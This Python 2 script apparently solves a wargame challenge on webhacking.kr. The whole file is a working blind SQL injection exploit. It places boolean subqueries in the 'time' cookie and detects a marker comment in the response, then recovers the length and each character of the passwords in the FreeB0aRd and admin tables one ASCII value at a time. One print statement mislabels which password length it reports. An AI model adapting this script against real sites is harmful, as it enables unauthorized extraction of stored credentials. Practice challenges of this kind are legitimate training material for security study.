import re, urllib, urllib2

adminpage_pw = ''
freeboard_pw = ''
myCookie = 'q5difcdhd3lr3ef7it9kngev43'
url = 'http://webhacking.kr/challenge/web/web-02/'
adminpage_pasw_length = 0
freeboard_pasw_length = 0

def blind_injection(query) :
	req = urllib2.Request(url)
	req.add_header('Cookie', 'time=1460606727 and %s; PHPSESSID=%s' % (query, myCookie))
	read = urllib2.urlopen(req).read()
	find = re.findall('<!--2070-01-01 09:00:01-->', read)
	return find

print 'Start finding the length of freeboard page password' ############################

for plen in range(1000) :
	find = blind_injection('(select length(password) from FreeB0aRd)=%d'%plen)
	if find :
		freeboard_pasw_length = plen
		break

print 'The length of admin page password : %d' % freeboard_pasw_length

print 'Start finding the length of admin page password' #############################

for plen in range(1000) :
	find = blind_injection('(select length(password) from admin)=%d'%plen)
	if find :
		adminpage_pasw_length = plen
		break

print 'The length of admin page password : %d' % adminpage_pasw_length

print 'Start finding freeboard password' #################################

for pwindex in range(1,freeboard_pasw_length+1) :
	for asc in range(33, 126) :		
		find = blind_injection('(select ascii(substring(password,%d,1)) from FreeB0aRd)=%d' % (pwindex, asc))
		if find :
			freeboard_pw += chr(asc)
			print chr(asc),
			break
print 
print 'Find freeboard password : %s' % freeboard_pw

print 'Start finding admin password' #####################################

for pwindex in range(1,adminpage_pasw_length+1) :
	for asc in range(33, 126) :		
		find = blind_injection('(select ascii(substring(password,%d,1)) from admin)=%d' % (pwindex, asc))
		if find :
			adminpage_pw += chr(asc)
			print chr(asc),
			break
print
print 'Find admin password : %s' % adminpage_pw

		
